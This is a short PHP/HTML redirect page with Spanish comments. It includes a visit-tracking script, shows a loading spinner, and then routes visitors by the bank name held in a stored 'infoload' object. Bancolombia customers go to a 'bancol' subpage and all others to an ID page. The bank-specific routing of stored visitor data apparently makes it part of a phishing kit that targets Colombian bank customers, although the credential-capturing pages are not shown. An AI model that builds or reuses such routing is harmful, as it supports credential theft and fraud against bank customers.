<?php require_once __DIR__ . '/../visit_handler.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redireccionando...</title>
  <style>
    /* Estilos para el loader */
    .loader {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border: 4px solid #f3f3f3; /* Color del borde */
      border-top: 4px solid gray; /* Color del borde superior (gris) */
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 2s linear infinite;
    }

    /* Animación de giro */
    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    /* Hacer que el cuerpo ocupe toda la altura */
    body {
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f7f7f7;
    }
  </style>
</head>
<body>
  <!-- Loader -->
  <div class="loader"></div>

  <script>
  function analizarBancoInfoload() {
    const infoload = JSON.parse(localStorage.getItem('infoload'));

    if (infoload && infoload.bank) {
      const banco = infoload.bank.toLowerCase();

      // Excepción: No redirigir si es "BANCOLOMBIA S.A.- NEQUI"
      if (banco.includes("bancolombia") && !banco.includes("bancolombia s.a.- nequi".toLowerCase())) {
        window.location.href = "bancol/index-pc.php";
      } else {
        window.location.href = "id.php"; // Redirige a id.php si no cumple la condición
      }
    } else {
      window.location.href = "id.php"; // Si no hay infoload, también redirige a id.php
    }
  }

  // Llamar a la función para realizar la redirección después de un breve tiempo
  setTimeout(analizarBancoInfoload, 1000); // Espera 1 segundo antes de ejecutar la función
</script>

</body>
</html>
